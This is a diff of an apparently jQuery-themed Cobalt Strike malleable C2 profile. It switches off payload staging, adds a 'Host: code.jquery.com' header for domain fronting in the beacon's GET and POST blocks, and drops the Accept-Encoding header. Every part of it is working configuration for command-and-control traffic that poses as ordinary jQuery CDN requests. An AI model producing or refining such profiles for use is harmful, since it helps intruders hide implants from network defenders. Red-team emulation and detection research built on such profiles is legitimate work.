@@ -239,8 +239,8 @@ set ssh_pipename      "wkssvc##";
 ##      - https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
 ##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)
 
-#set host_stage "false"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes
-set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
+set host_stage "false"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes
+#set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
 
 http-stager {  
     set uri_x86 "/jquery-3.3.1.slim.min.js";
@@ -536,9 +536,9 @@ http-get {
     client {
 
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-        #header "Host" "code.jquery.com";
+        header "Host" "code.jquery.com";
         header "Referer" "http://code.jquery.com/";
-        header "Accept-Encoding" "gzip, deflate";
+        #header "Accept-Encoding" "gzip, deflate";
 
         metadata {
             base64url;
@@ -596,9 +596,9 @@ http-post {
     client {
 
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-        #header "Host" "code.jquery.com";
+        header "Host" "code.jquery.com";
         header "Referer" "http://code.jquery.com/";
-        header "Accept-Encoding" "gzip, deflate";
+        #header "Accept-Encoding" "gzip, deflate";
        
         id {
             mask;       
